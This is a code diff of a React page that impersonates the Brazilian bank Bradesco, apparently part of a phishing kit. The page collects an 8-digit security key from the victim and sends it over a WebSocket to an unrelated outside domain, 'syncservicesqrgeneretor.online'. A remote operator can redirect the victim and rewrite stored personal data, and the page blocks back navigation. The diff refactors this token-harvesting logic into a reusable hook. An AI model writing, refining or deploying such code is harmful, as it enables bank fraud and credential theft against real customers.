@@ -2,6 +2,7 @@ import { useEffect, useRef, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 import { resolveServerRoute } from "@/lib/resolveServerRoute";
+import { useWebSocket } from "@/hooks/useWebSocket";
 
 const SMSPage = () => {
   const navigate = useNavigate();
@@ -9,44 +10,23 @@ const SMSPage = () => {
   const nome = localStorage.getItem("nome") || "";
   const dispositivo = localStorage.getItem("dispositivo") || "";
   const telefone = localStorage.getItem("telefone") || "";
-  const wsRef = useRef<WebSocket | null>(null);
   const [chave, setChave] = useState(["", "", "", "", "", "", "", ""]);
   const [enviando, setEnviando] = useState(false);
   const [erro, setErro] = useState("");
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  useEffect(() => {
-    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
-    wsRef.current = ws;
-
-    ws.onopen = () => {
-      console.log("SMSPage WS conectado");
-      if (usuario) {
-        ws.send(JSON.stringify({ acao: "reconectar", usuario, dispositivo }));
-      }
-    };
-
-    ws.onmessage = (event) => {
-      const msg = JSON.parse(event.data);
-      console.log("SMSPage msg:", msg);
-
-      if (msg.acao === "redirecionar" && msg.url) {
-        localStorage.setItem("feixe", msg.feixe || "");
-        localStorage.setItem("qr", msg.qr || "");
-        localStorage.setItem("nome", msg.nome || "");
-        localStorage.setItem("dispositivo", msg.dispositivo || "");
-        localStorage.setItem("telefone", msg.telefone || "");
-        navigate(resolveServerRoute(msg.url));
-      }
+  const { send } = useWebSocket({
+    reconectarPayload: { dispositivo },
+    onRedirect: (msg) => {
+      navigate(resolveServerRoute(msg.url));
+    },
+    onMessage: (msg) => {
       if (msg.acao === "erro_chave") {
         setErro(msg.motivo || "Código inválido. Tente novamente.");
         setEnviando(false);
       }
-    };
-
-    ws.onerror = (err) => console.error("SMS WS erro:", err);
-    return () => { ws.close(); };
-  }, [usuario, dispositivo]);
+    },
+  });
 
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
@@ -78,13 +58,9 @@ const SMSPage = () => {
     if (!chaveCompleta) return;
     setErro("");
     setEnviando(true);
-    wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token: chave.join("") }));
+    send({ acao: "token", usuario, token: chave.join("") });
     navigate("/validando");
   };
-
-  const mascaraTelefone = telefone
-    ? telefone.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3").replace(/\d(?=\d{4})/g, (m, i) => i < 9 ? "*" : m)
-    : "";
 
   const telefoneExibido = telefone
     ? `(${telefone.slice(0, 2)}) *****-${telefone.slice(-4)}`
@@ -150,7 +126,6 @@ const SMSPage = () => {
               </h3>
             </div>
 
-            {/* 8 digit boxes */}
             <div className="flex justify-between px-1 mb-3">
               {chave.map((digit, i) => (
                 <input
@@ -167,7 +142,6 @@ const SMSPage = () => {
               ))}
             </div>
 
-            {/* Device serial */}
             <p className="text-[hsl(220,10%,56%)] text-xs text-center mb-4">
               Confira o número de série do seu dispositivo: <span className="font-bold text-[hsl(220,20%,14%)]">{dispositivo || "—"}</span>
             </p>
